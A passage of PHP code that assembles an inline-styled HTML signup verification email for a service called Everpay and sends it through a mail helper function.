	$signup_mail .= "  </tr></table><table class=\"container\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: inherit; width: 580px; margin: 0 auto; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\" align=\"left\" valign=\"top\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "  <table class=\"row\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 100%; position: relative; display: block; padding: 0px;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"wrapper last\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; position: relative; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 10px 0px 0px;\" align=\"left\" valign=\"top\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "    <table class=\"twelve columns\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 580px; margin: 0 auto; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"left-text-pad\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0px 0px 10px 10px;\" align=\"left\" valign=\"top\">\n"; 
	$signup_mail .= "      <h4 class=\"\" style=\"color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 1.3; word-break: normal; font-size: 25px; margin: 0; padding: 30px 0 10px;\" align=\"left\">\n"; 
	$signup_mail .= "        Hi <strong>".$name."</strong>, just one more step!\n"; 
	$signup_mail .= "      </h4>\n"; 
	$signup_mail .= "      <p class=\"instructions\" style=\"color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; margin: 0 0 10px; padding: 10px 0 30px;\" align=\"left\">\n"; 
	$signup_mail .= "        We just need to verify your email address to complete your Everpay signup.\n"; 
	$signup_mail .= "      </p>\n"; 
	$signup_mail .= $activation; 
	$signup_mail .= "      <p class=\"info\" style=\"color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; margin: 0 0 10px; padding: 40px 0 0;\" align=\"left\">\n"; 
	$signup_mail .= "        Please note that this link will expire in 24 hours.\n"; 
	$signup_mail .= "      </p>\n"; 
	$signup_mail .= "      <p class=\"info\" style=\"color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; margin: 0 0 10px; padding: 0;\" align=\"left\">\n"; 
	$signup_mail .= "        If you have not signed up for Everpay, please ignore this email.\n"; 
	$signup_mail .= "      </p>\n"; 
	$signup_mail .= "      <p class=\"info\" style=\"color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; margin: 0 0 10px; padding: 35px 0 0;\" align=\"left\">\n"; 
	$signup_mail .= "        The team at Everpay.\n"; 
	$signup_mail .= "      </p>\n"; 
	$signup_mail .= "    </td>\n"; 
	$signup_mail .= "    <td class=\"expander\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; visibility: hidden; width: 0px; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\" align=\"left\" valign=\"top\"></td>\n"; 
	$signup_mail .= "  </tr></table></td>\n"; 
	$signup_mail .= "</tr></table><table class=\"row footer\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: center; width: 100%; position: relative; display: block; padding: 40px 0px 0px;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td class=\"wrapper last\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; position: relative; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 10px 0px 0px;\" align=\"left\" valign=\"top\">\n"; 
	$signup_mail .= "\n"; 
	$signup_mail .= "<table class=\"twelve columns\" style=\"border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; width: 580px; margin: 0 auto; padding: 0;\"><tr style=\"vertical-align: top; text-align: left; padding: 0;\" align=\"left\"><td align=\"center\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0px 0px 10px;\" valign=\"top\">\n"; 
	$signup_mail .= "  <center style=\"width: 100%; min-width: 580px;\">\n"; 
	$signup_mail .= "    <p style=\"text-align: center; font-size: 13px; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; margin: 0 0 10px; padding: 0;\" align=\"center\">\n"; 
	$signup_mail .= "      <a href=\"#\" style=\"color: #2B7ECB; text-decoration: none;\">Terms</a> | <a href=\"#\" style=\"color: #2B7ECB; text-decoration: none;\">Privacy</a> | <a href=\"#\" style=\"color: #2B7ECB; text-decoration: none;\">Unsubscribe</a>\n"; 
	$signup_mail .= "    </p>\n"; 
	$signup_mail .= "    <p style=\"text-align: center; font-size: 13px; color: #888; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; margin: 0 0 10px; padding: 0;\" align=\"center\">\n"; 
	$signup_mail .= "      If you have any questions you can contact us at <a href=\"#\" style=\"color: #2B7ECB; text-decoration: none;\">info@everpayinc.com</a>\n"; 
	$signup_mail .= "    </p>\n"; 
	$signup_mail .= "  </center>\n"; 
	$signup_mail .= "</td>\n"; 
	$signup_mail .= "<td class=\"expander\" style=\"word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: left; visibility: hidden; width: 0px; color: #222222; font-family: 'Helvetica Neue', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;\" align=\"left\" valign=\"top\"></td>\n"; 
	$signup_mail .= "</tr></table></td>\n"; 
	$signup_mail .= "</tr></table><!-- container end below --></td>\n"; 
	$signup_mail .= "</tr></table></center>\n"; 
	$signup_mail .= "</td>\n"; 
	$signup_mail .= "</tr></table></body>\n"; 
	$signup_mail .= "</html>\n"; 
	$signup_mail .= "\n";

	$send_mail = mailfunction($email,"no-reply@everpayinc.com",'Email Verification',$signup_mail);

}